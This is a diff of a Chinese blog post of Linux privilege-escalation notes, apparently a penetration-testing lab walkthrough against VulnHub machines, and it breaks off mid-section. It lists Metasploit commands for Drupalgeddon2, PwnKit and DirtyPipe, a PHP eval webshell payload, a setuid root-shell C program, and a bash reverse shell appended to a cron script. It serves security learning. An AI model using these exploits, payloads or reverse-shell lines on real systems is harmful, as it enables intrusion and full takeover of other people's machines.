@@ -19,7 +19,7 @@
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/25663185/1724901611974-a20e2fea-6dac-46f3-8a0e-4654bd69e5a2.png">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/25663185/1724901632225-67d2ff77-6a66-48aa-b8e2-50d5f9235252.png">
 <meta property="article:published_time" content="2024-09-30T14:51:29.000Z">
-<meta property="article:modified_time" content="2024-12-30T09:13:16.799Z">
+<meta property="article:modified_time" content="2024-12-30T09:33:03.622Z">
 <meta property="article:author" content="Ca1m">
 <meta property="article:tag" content="权限提升">
 <meta property="article:tag" content="web">
@@ -126,7 +126,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux"><span class="toc-number">1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%AD%9B%E9%80%89%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">内核漏洞筛选：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-linux%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">web-linux应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见内核漏洞案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-Dcow"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Web&amp;内核溢出-Dcow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-Pwnkit"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Web&amp;内核溢出-Pwnkit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-DirtyPipe"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">Web&amp;内核溢出-DirtyPipe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-NFS%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">Web&amp;用户-NFS安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Cron%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">Web&amp;用户-Cron任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-Web-%E7%94%A8%E6%88%B7-PATH%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.4.</span> <span class="toc-text">Linux系统提权-Web&amp;用户-PATH变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-SUDO%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text">SUID&amp;SUDO应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Suid"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">Web&amp;用户-Suid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Sudo-cve-%E7%94%A8%E6%88%B7%E6%98%AF%E5%9B%A0%E4%B8%BAgit%E8%BF%99%E7%A7%8D%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%94%AF%E6%8C%81"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-UDF%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.6.</span> <span class="toc-text">Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Capability%E8%83%BD%E5%8A%9B-%E7%90%86%E8%A7%A3%E4%B8%BASUID%E5%8D%87%E7%BA%A7%E7%89%88"><span class="toc-number">1.3.7.</span> <span class="toc-text">Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-LD-Preload%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.3.8.</span> <span class="toc-text">普通用户-LD_Preload加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-Rbash%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">普通用户-Rbash绕过</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux"><span class="toc-number">1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%AD%9B%E9%80%89%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">内核漏洞筛选：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-linux%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">web-linux应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见内核漏洞案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-Dcow"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Web&amp;内核溢出-Dcow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-Pwnkit"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Web&amp;内核溢出-Pwnkit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-DirtyPipe"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">Web&amp;内核溢出-DirtyPipe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-NFS%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">Web&amp;用户-NFS安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Cron%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">Web&amp;用户-Cron任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-Web-%E7%94%A8%E6%88%B7-PATH%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.4.</span> <span class="toc-text">Linux系统提权-Web&amp;用户-PATH变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-SUDO%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text">SUID&amp;SUDO应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Suid"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">Web&amp;用户-Suid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Sudo-cve-%E7%94%A8%E6%88%B7%E6%98%AF%E5%9B%A0%E4%B8%BAgit%E8%BF%99%E7%A7%8D%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%94%AF%E6%8C%81"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-UDF%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.6.</span> <span class="toc-text">Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAxiaodi%E8%A1%A8"><span class="toc-number">2.</span> <span class="toc-text">创建xiaodi表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BE%80xiaodi%E8%A1%A8%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9A%84udf-so"><span class="toc-number">3.</span> <span class="toc-text">往xiaodi表中插入二进制的udf.so</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAudf-so"><span class="toc-number">4.</span> <span class="toc-text">导出udf.so</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAdo-system%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">创建do_system自定义函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Capability%E8%83%BD%E5%8A%9B-%E7%90%86%E8%A7%A3%E4%B8%BASUID%E5%8D%87%E7%BA%A7%E7%89%88"><span class="toc-number">5.0.1.</span> <span class="toc-text">Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-LD-Preload%E5%8A%A0%E8%BD%BD"><span class="toc-number">5.0.2.</span> <span class="toc-text">普通用户-LD_Preload加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-Rbash%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">普通用户-Rbash绕过</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -176,372 +176,366 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><font style="color:#000000;">Linux</font></h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><font style="color:#000000;">信息收集</font></h2><p><font style="color:#000000;">当前主机的操作系统</font></p>
-<p><font style="color:#000000;">hostnamectl</font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;*-release</font></p>
-<p><font style="color:#000000;">lsb_release -a </font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;lsb-release # Debain</font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;redhat-release # Redhat</font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;centos-release # Centos</font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;os-release # Ubuntu</font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;issue</font></p>
-<p><font style="color:#000000;">当前主机的内核版本</font></p>
-<p><font style="color:#000000;">hostnamectl</font></p>
-<p><font style="color:#000000;">uname -a </font></p>
-<p><font style="color:#000000;">cat &#x2F;proc&#x2F;version</font></p>
-<p><font style="color:#000000;">dmesg | grep “Linux version”</font></p>
-<h2 id="内核漏洞筛选："><a href="#内核漏洞筛选：" class="headerlink" title="内核漏洞筛选："></a><font style="color:#000000;">内核漏洞筛选：</font></h2><p>下面的msf测试均在kali中进行</p>
-<p><font style="color:#000000;">MSF检测：</font></p>
-<p><font style="color:#000000;">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</font></p>
-<p><font style="color:#000000;">提权脚本:</font></p>
-<p><font style="color:#000000;">筛选可能存在提权漏洞的信息，主要是内核漏洞提权</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></font></p>
-<p><font style="color:#DF2A3F;"><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a></font></p>
-<p><font style="color:#000000;">综合脚本:</font></p>
-<p><font style="color:#000000;">包含一些其他CVE，但内核漏洞提权效果不如上面</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></font></p>
-<h2 id="web-linux应用场景："><a href="#web-linux应用场景：" class="headerlink" title="web-linux应用场景："></a><font style="color:#000000;">web-linux应用场景：</font></h2><p><font style="color:#000000;">获取到Web权限在Linux服务器上时进行的内核漏洞提权</font></p>
-<h3 id="常见内核漏洞案例："><a href="#常见内核漏洞案例：" class="headerlink" title="常见内核漏洞案例："></a><font style="color:#000000;">常见内核漏洞案例：</font></h3><p><font style="color:#000000;">dirtycow（CVE-2016-5159）</font></p>
-<p><font style="color:#000000;">Pwnkit (CVE-2021-4034) </font></p>
-<p><font style="color:#000000;">Dirty Pipe（CVE-2022-0847)</font></p>
-<p><font style="color:#000000;">SUDO （CVE-2021-3156）</font></p>
-<p><font style="color:#000000;">大脏牛 (CVE-2017–1000405)</font></p>
-<p><font style="color:#000000;">CVE-2017-16995</font></p>
-<p><font style="color:#000000;">CVE-2021-3560</font></p>
-<p><font style="color:#000000;">CVE-2023-1829 </font></p>
-<p><font style="color:#000000;">CVE-2022-2588 </font></p>
-<p><font style="color:#000000;">CVE-2021-3493</font></p>
-<p><font style="color:#000000;">CVE-2022-32250</font></p>
-<p><font style="color:#000000;">CVE-2023-3269</font></p>
-<p><font style="color:#000000;">CVE-2022-0995</font></p>
-<p><font style="color:#000000;">CVE-2022-2639</font></p>
-<p><font style="color:#000000;">CVE-2023-0386</font></p>
-<p><font style="color:#000000;">…</font></p>
-<h4 id="Web-内核溢出-Dcow"><a href="#Web-内核溢出-Dcow" class="headerlink" title="Web&amp;内核溢出-Dcow"></a><font style="color:#000000;">Web&amp;内核溢出-Dcow</font></h4><p><font style="color:#000000;">复现环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></font></p>
-<p><font style="color:#000000;">1、信息收集：</font></p>
-<p><font style="color:#000000;">&#x2F;&#x2F;全端口扫描</font></p>
-<p><font style="color:#000000;">nmap -p1-65535 192.168.139.0&#x2F;24</font></p>
-<p><font style="color:#000000;">2、Web漏洞利用：&#x2F;&#x2F;msf</font></p>
-<p><font style="color:#000000;">search drupal</font></p>
-<p><font style="color:#000000;">use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</font></p>
-<p><font style="color:#000000;">set rhost 192.168.46.144</font></p>
-<p><font style="color:#000000;">set rport 1898</font></p>
-<p><font style="color:#000000;">run</font></p>
-<p><font style="color:#000000;">3、内核提权：</font></p>
-<p><font style="color:#000000;">upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</font></p>
-<p><font style="color:#000000;">shell</font></p>
-<p><font style="color:#000000;">cd &#x2F;tmp</font></p>
-<p><font style="color:#000000;">chmod +x 1.sh</font></p>
-<p><font style="color:#000000;">.&#x2F;1.sh</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></font></p>
-<p><font style="color:#000000;">upload &#x2F;root&#x2F;dcow.cpp &#x2F;tmp&#x2F;dcow.cpp</font></p>
-<p><font style="color:#000000;">g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil      &#x2F;有可能编译不了，如果目标机器上不能变异就在攻击机编译完，直接从攻击机上传编译完的 </font></p>
-<p><font style="color:#000000;">python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</font></p>
-<p><font style="color:#000000;">.&#x2F;dcow</font></p>
-<p><font style="color:#000000;">su root</font></p>
-<p><font style="color:#000000;">该漏洞只能利用一次，做完需要还原</font></p>
-<h4 id="Web-内核溢出-Pwnkit"><a href="#Web-内核溢出-Pwnkit" class="headerlink" title="Web&amp;内核溢出-Pwnkit"></a><font style="color:#000000;">Web&amp;内核溢出-Pwnkit</font></h4><p><font style="color:#000000;">复现环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a></font></p>
-<p><font style="color:#000000;">入口点是该网站修改用户名抓取id可以修改，后登录发现上传文件可以通过.phtml绕过，拿到webshell</font></p>
-<p><font style="color:#000000;">1、信息收集：</font></p>
-<p><font style="color:#000000;">nmap -p1-65535 192.168.139.0&#x2F;24</font></p>
-<p><font style="color:#000000;">2、Web漏洞利用：</font></p>
-<p><font style="color:#000000;">重置管理密码-上传1.phtml-反弹MSF，哥斯拉里面PMeterpreter模块可以反弹到msf上</font></p>
-<p><font style="color:#000000;">use exploit&#x2F;multi&#x2F;handler </font></p>
-<p><font style="color:#000000;">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</font></p>
-<p><font style="color:#000000;">set lhost 0.0.0.0</font></p>
-<p><font style="color:#000000;">set lport 6666</font></p>
-<p><font style="color:#000000;">run</font></p>
-<p><font style="color:#000000;">3、内核提权</font></p>
-<p><font style="color:#000000;">upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</font></p>
-<p><font style="color:#000000;">shell</font></p>
-<p><font style="color:#000000;">cd &#x2F;tmp</font></p>
-<p><font style="color:#000000;">chmod +x 1.sh</font></p>
-<p><font style="color:#000000;">.&#x2F;1.sh</font></p>
-<p><font style="color:#000000;">search cve_2021_4034</font></p>
-<p><font style="color:#000000;">use exploit&#x2F;linux&#x2F;local&#x2F;cve_2021_4034_pwnkit_lpe_pkexec</font></p>
-<p><font style="color:#000000;">set session x</font></p>
-<p><font style="color:#000000;">run</font></p>
-<p><font style="color:#000000;">getuid</font></p>
-<p><font style="color:#000000;">shell</font></p>
-<p><font style="color:#000000;">cd &#x2F;root</font></p>
-<p><font style="color:#000000;">cat root.txt</font></p>
-<h4 id="Web-内核溢出-DirtyPipe"><a href="#Web-内核溢出-DirtyPipe" class="headerlink" title="Web&amp;内核溢出-DirtyPipe"></a><font style="color:#000000;">Web&amp;内核溢出-DirtyPipe</font></h4><p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></font></p>
-<p><font style="color:#000000;">1、信息收集：</font></p>
-<p><font style="color:#000000;">nmap -p1-65535 192.168.139.0&#x2F;24</font></p>
-<p><font style="color:#000000;">2、Web漏洞利用</font></p>
-<p><font style="color:#000000;">扫描发现-抓包分析-文件写入-反弹MSF</font></p>
-<p><font style="color:#000000;">gobuster dir -u <a target="_blank" rel="noopener" href="http://192.168.139.146/">http://192.168.139.146</a> -x php,bak,txt,html -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</font></p>
-<p><font style="color:#000000;">扫到一个php文件为漏洞入口，可以上传一句话木马拿到webshell，下面为抓包的流量，可以看到post传入的时候也会明文显示文件名</font></p>
-<p><font style="color:#000000;">message&#x3D;<?php eval($_POST["pass"]);?>&amp;file&#x3D;xd.php</font></p>
-<p><font style="color:#000000;">哥斯拉webshell连上去接着用PMeterpreter模块打msf</font></p>
-<p><font style="color:#000000;">use exploit&#x2F;multi&#x2F;handler </font></p>
-<p><font style="color:#000000;">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</font></p>
-<p><font style="color:#000000;">set lhost 0.0.0.0</font></p>
-<p><font style="color:#000000;">set lport 6666</font></p>
-<p><font style="color:#000000;">run</font></p>
-<p><font style="color:#000000;">3、内核提权</font></p>
-<p><font style="color:#000000;">upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</font></p>
-<p><font style="color:#000000;">shell</font></p>
-<p><font style="color:#000000;">cd &#x2F;tmp</font></p>
-<p><font style="color:#000000;">chmod +x 1.sh</font></p>
-<p><font style="color:#000000;">.&#x2F;1.sh   &#x2F;&#x2F;执行完发现有cve_2022_0847可以利用</font></p>
-<p><font style="color:#000000;">search cve_2022_0847</font></p>
-<p><font style="color:#000000;">use exploit&#x2F;linux&#x2F;local&#x2F;cve_2022_0847_dirtypipe</font></p>
-<p><font style="color:#000000;">set session x</font></p>
-<p><font style="color:#000000;">set lhost xx.xx.xx.xx</font></p>
-<p><font style="color:#000000;">run</font></p>
-<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a><font style="color:#000000;">补充</font></h4><p><font style="color:#000000;">CVE-2023-0386</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q">https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q</a></font></p>
-<h3 id="Web-用户-NFS安全"><a href="#Web-用户-NFS安全" class="headerlink" title="Web&amp;用户-NFS安全"></a><font style="color:#000000;">Web&amp;用户-NFS安全</font></h3><p><font style="color:#000000;">NFS是一种基于TCP&#x2F;IP 传输的网络文件系统协议，通过使用NFS协议，客户机可以像访问本地目录一样访问远程服务器中的共享资源。</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/">https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/</a></font></p>
-<p><font style="color:#000000;">提升条件：NFS服务开启和web或用户权限进行利用</font></p>
-<p><font style="color:#000000;">1、信息收集：</font></p>
-<p><font style="color:#000000;">nmap 192.168.1.6</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.1.6/file.php?file=/etc/passwd">http://192.168.1.6/file.php?file=/etc/passwd</a></font></p>
-<p><font style="color:#000000;">2、NFS服务利用</font></p>
-<p><font style="color:#000000;">showmount -e 192.168.1.6    链接</font></p>
-<p><font style="color:#000000;">mkdir nfs</font></p>
-<p><font style="color:#000000;">mount -t nfs 192.168.1.6:&#x2F;mnt&#x2F;nfs .&#x2F;nfs  把攻击机的nfs和目标机器的&#x2F;mnt&#x2F;nfs同步，注意如果上传马要给权限</font></p>
-<p><font style="color:#000000;">chmod 777 shell.php</font></p>
-<p><font style="color:#000000;">3、配合SUID提权</font></p>
-<p><font style="color:#000000;">注意gcc编译机器与目标机内核版本相似</font></p>
-<p><font style="color:#000000;">直接cp复制机器上的suid文件也可以，改名再上传</font></p>
-<p><font style="color:#000000;">#include&lt;stdlib.h&gt;</font></p>
-<p><font style="color:#000000;">#include&lt;unistd.h&gt;</font></p>
-<p><font style="color:#000000;">int main()</font></p>
-<p><font style="color:#000000;">{</font></p>
-<p><font style="color:#000000;">setuid(0);</font></p>
-<p><font style="color:#000000;">system(“id”);</font></p>
-<p><font style="color:#000000;">system(“&#x2F;bin&#x2F;bash”);</font></p>
-<p><font style="color:#000000;">}</font></p>
-<p><font style="color:#000000;">gcc getroot.c -o getroot</font></p>
-<p><font style="color:#000000;">cp getroot &#x2F;root&#x2F;nfs #复制bash到挂载目录下</font></p>
-<p><font style="color:#000000;">chmod +s getroot #赋予suid权限</font></p>
-<p><font style="color:#000000;">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 再看看是否加入</font></p>
-<p><font style="color:#000000;">cd &#x2F;mnt&#x2F;nfs # 目标机</font></p>
-<p><font style="color:#000000;">.&#x2F;getroot # 目标机</font></p>
-<h3 id="Web-用户-Cron任务"><a href="#Web-用户-Cron任务" class="headerlink" title="Web&amp;用户-Cron任务"></a><font style="color:#000000;">Web&amp;用户-Cron任务</font></h3><p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></font></p>
-<p><font style="color:#000000;">提升条件：Web或用户权限进行查看，任务文件可修改</font></p>
-<p><font style="color:#000000;">1、信息收集：</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.152/access.html">http://192.168.139.152/access.html</a></font></p>
-<p><font style="color:#000000;">2、权限获取：</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.152:8080/">http://192.168.139.152:8080/</a></font></p>
-<p><font style="color:#000000;">Jenkins创建任务，添加反弹，立即构建</font></p>
-<p><font style="color:#000000;">这边添加的反弹可能是web用户或者普通用户权限 </font></p>
-<p><font style="color:#000000;">3、权限提升：</font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;crontab</font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh #查看脚本内容</font></p>
-<p><font style="color:#000000;">ls -lia &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh #查看对任务文件的权限</font></p>
-<p><font style="color:#000000;">echo “&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.139.141&#x2F;66 0&gt;&amp;1” &gt;&gt; &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh</font></p>
-<h3 id="Linux系统提权-Web-用户-PATH变量"><a href="#Linux系统提权-Web-用户-PATH变量" class="headerlink" title="Linux系统提权-Web&amp;用户-PATH变量"></a><font style="color:#000000;">Linux系统提权-Web&amp;用户-PATH变量</font></h3><p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></font></p>
-<p><font style="color:#000000;">提升条件：存在SUID的应用中能可逆向出执行命令，加用户权限</font></p>
-<p><font style="color:#000000;">目标开放445端口，判断有smb服务 </font></p>
-<p><font style="color:#000000;">1、信息收集：</font></p>
-<p><font style="color:#000000;">smbclient -L 192.168.139.153</font></p>
-<p><font style="color:#000000;">2、权限获取：</font></p>
-<p><font style="color:#000000;">smbclient &#x2F;&#x2F;192.168.139.153&#x2F;anonymous</font></p>
-<p><font style="color:#000000;">get attention.txt</font></p>
-<p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;">smbclient &#x2F;&#x2F;192.168.139.153&#x2F;helios -U helios</font></p>
-<p><font style="color:#000000;">helios \ qwerty</font></p>
-<p><font style="color:#000000;">3、漏洞利用&#x2F;&#x2F;从上面可以得到一个wordpress网站 wpscan kali自带</font></p>
